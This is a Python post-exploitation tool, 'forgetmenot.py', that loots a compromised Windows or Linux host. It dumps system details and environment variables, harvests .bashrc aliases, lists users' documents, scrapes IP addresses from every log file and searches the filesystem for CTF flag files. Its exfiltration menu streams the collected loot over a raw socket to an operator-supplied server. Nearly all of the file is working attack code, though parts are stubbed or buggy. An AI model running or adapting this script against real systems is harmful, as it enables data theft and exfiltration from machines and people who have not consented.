import re, sys, os, platform
import ipaddress, socket
from subprocess import Popen, PIPE

#
#       forgetmenot.py
#               a local looting script in Python for Win/Lin/OSX hosts
#
#       Eric Valenzuela, eevn.io
#       June 20, 2017
#

### Main Menu --start--
def mainmenu():
    outfiles = [None]
    try:
        mitem = None
        while mitem != 5:
            print('\nforgetmenot looting script\nPlease make a selection.\n   1: Lootme\n   2: Exfil Options\n   3: Compression/ Encryption Options\n   4: Flag hunt\n   5: Exit')
            try:
                mitem = input('fmn_$>')
            except SyntaxError:
                mitem = None
            if mitem == 5:      # exit
                print('Exiting')
                return
            elif mitem == 1:    # lootme
                outfiles = lootme_stub(outfiles)
            elif mitem == 2:    # exfil options
                exfil_options(outfiles)
            elif mitem == 3:    # compression/ encryption options
                print(3)
            elif mitem == 4:    # flag hunt
                outfiles = flaghunt(outfiles)
            else:
                print("Invalid Selection.")
                mitem = None
    except SystemError:
        print('Runtime error:')
        for i in sys.exc_info():
            print(i)
    return
### Main Menu --end--

### lootme_stub --start--
def lootme_stub(outfiles):
    if platform.system() == 'Windows':
        print('Running on Windows...')
        outfiles = lootme_windows(outfiles)
    elif platform.system() == 'Linux':
        print('Running on Linux...')
        outfiles = lootme_linux(outfiles)
    elif platform.system() == 'OSX':
        print('Running on OSX...')
        lootme_osx()
    else:
        print('OS not recognized. Exiting.')
    return outfiles
### lootme_stub --end--

### lootme_windows --start--
def lootme_windows(outfiles):
    import winreg
    if "systemdrive" in os.environ:
        osroot = os.listdir(os.environ["systemdrive"])
    if "computername" in os.environ:
        hostloot = (os.environ["computername"]+"_loot.txt")
    else:
        hostloot = ((platform.uname()[1])+"_loot.txt")
    outfiles.append(hostloot)
    with open(hostloot, 'w') as outFile:
        # Dump machine information
        outFile.write('Machine info:\n')
        outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
        # Dump environment variables
        outFile.write("Environment vars:\n"+str(os.environ)+'\n')
        
    return
### lootme_windows --end--

### lootme_linux --start--
def lootme_linux(outfiles):
    userdirs = os.listdir('/home/')
    hostloot = (platform.uname()[1]+'_loot.txt')
    outfiles.append(hostloot)
    with open(hostloot, 'w') as outFile:
        
        # Dump machine information
        outFile.write('Machine info:\n')
        outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
        # Dump environment variables
        outFile.write("Environment vars:\n"+str(os.environ)+'\n')

        # search user files for extractable data
        for d in userdirs:
            outFile.write('\nUser: '+d+'\n')
            
            # search bashrc files for alias designations
            with open(('/home/'+str(d)+'/.bashrc'), 'r') as bashrc:
                outFile.write('\n.bashrc file:\n')
                content = bashrc.readlines()
                for line in content:
                    if re.match('[.]*alias [.]*', line):
                        outFile.write(line)
            
        # search for list of user files
        userfiles = (platform.uname()[1]+'_userFiles.txt')
        outfiles.append(userfiles)
        with open(userfiles, 'w') as ufs:
            ufs.write('\nFiles discovered:')
            for d in userdirs:
                for path, subdirs, files in os.walk('/home/'+d):
                    for name in files:
                        # search user directories for specified filetypes:
                        #   pdf, txt, doc(x)
                        if re.search('[.]*\.pdf', name) or re.search('[.]*\.txt', name) or re.search('[.]*\.doc[.]{1}', name):
                            ufs.write('\n'+os.path.join(path, name)+'\n')

        # search entire os for .log files, and grab all unique IP addresses
        unique_ips = [None]
        for path, subdirs, files in os.walk('/'):
            for name in files:
                if re.search('[.]*\.log', name):
                    #print('log file: ' + name)
                    try:
                        with open(os.path.join(path, name), 'r') as logFile:
                            for line in logFile:
                                #ips = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)
                                # this regex is the best way I've come up with to only grab valid IPs. If you do not reverse the order from how the IP is read (i.e. by checking right-to-left), then 80.80.80.80 will return 80.80.80.8, since the single-digit will match before the 2-digit possibility is checked.
                                ips  = re.findall('((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]))', line)
                                if ips is not None:
                                    for ip in ips:
                                        if ip not in unique_ips:
                                            #print(str(ip))
                                            if unique_ips == [None]:
                                                unique_ips = [ip]
                                            else:
                                                unique_ips.append(ip)
                    except IOError:
                        print('IO Error. Likely do not have read permissions.')
        if unique_ips is not [None]:
            outFile.write('\nUnique IPs from logs:\n')
            unique_ips.sort()
            for ip in unique_ips:
                outFile.write(str(ip)+'\n')
    return outfiles
### lootme_linux --end--

### lootme_osx --start--
def lootme_osx():
    return
### lootme_osx --end--

### exfil options --start--
def exfil_options(outfiles):
    for i in outfiles:
        if i is not None:
            print('file: '+i)
    try:
        mitem = None
        while mitem != 2:
            print('\nExfil options:\n   1: send loot files to server\n   2: Back to main menu')
            try:
                mitem = input('fmn_$>')
            except SyntaxError:
                print('Syntax error.')
                mitem = None
            if mitem == 2:      # exit
                print('Exiting')
                return
            elif mitem == 1:
                send2srvr(outfiles)
            else:
                mitem = None
                print('Invalid selection.')
    except:
        print('Error. Returning to main menu.')
        return
    return
### exfil options --end--

### send to server --start--
def send2srvr(outfiles):
    print('\nEnter port to connect to.')
    port = input()
    sock = socket.socket()
    print('\nEnter server IP')
    host = str(raw_input())
    if re.match('\d{1,5}', str(port)):
        try:
            sock.connect((host, port))
            with open((platform.uname()[1]+'_loot.txt'), 'r') as sendfile:
                l = sendfile.read(1024)
                while(l):
                    print('Sending...')
                    sock.send(l)
                    l = sendfile.read(1024)
                sendfile.close()
                print('Done sending.')
                sock.close()
        except:
            print('Something bad happened.\n')
            for i in sys.exc_info():
                print(i)
        print('Error in port number.')
### send to server --end--

### flag hunt --start--
def flaghunt(outfiles):
    hostflags = (platform.uname()[1]+'_flagFiles.txt')
    outfiles.append(hostflags)
    with open(hostflags, 'w') as outFile:
        outFile.write('Potential flags found:\n')
        for path, subdirs, files in os.walk('/'):
            for name in files:
                # List of ignored locations and filetypes:
                #   /var/lib
                #   /sys
                #   /proc
                #   /usr/src
                #   /usr/share/help
                #   /usr/share/man
                #   /usr/lib
                #   *.h
                #   *.page
                if (re.search('[.]*flag[.]*', name) 
                    and not re.search('^/var/lib/', path) 
                    and not re.search('^/sys/', path) 
                    and not re.search('^/proc/', path) 
                    and not re.search('^/usr/src/', path) 
                    and not re.search('^/usr/share/help/', path) 
                    and not re.search('^/usr/share/man/', path) 
                    and not re.search('^/usr/lib/', path) 
                    and not re.search('[.]*\.h', name) 
                    and not re.search('[.]*\.page', name)):
                    #print(os.path.join(path, name))
                    outFile.write(os.path.join(path, name)+'\n')
    return outfiles
### flag hunt --end--

### Program init --start--
mainmenu()
